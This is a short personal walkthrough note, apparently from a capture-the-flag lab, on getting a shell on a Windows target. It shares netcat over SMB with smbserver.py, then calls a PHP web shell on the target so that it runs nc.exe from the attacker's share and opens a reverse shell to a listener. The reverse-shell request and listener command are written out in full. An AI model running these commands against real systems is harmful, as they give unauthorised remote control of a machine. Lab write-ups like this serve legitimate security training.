# Windows
### Netcat
#### Transferring netcat by SMB
https://eternallybored.org/misc/netcat/

`sudo unzip netcat-win32-1.12.zip -d netcat`

#### Creating a shared folder
`smbserver.py smbFolder $(pwd) -smv2support` *smbFolder is the shared ressource, we active the smb support, and this in syncronized with the current path*

![[Pasted image 20240324064441.png]]

Remote connection stablished, it's possible to see the shared folder
![[Pasted image 20240324071929.png]]
![[Pasted image 20240324071853.png]]
Updating the payload:
`http://10.10.10.198:8080/upload/kamehameha.php?telepathy=\\10.10.14.70\smbFolder\nc.exe -e cmd 10.10.14.70 4443`

Using `❯ rlwrap nc -nlvp 4443` we've got a more interactive console
![[Pasted image 20240324072620.png]]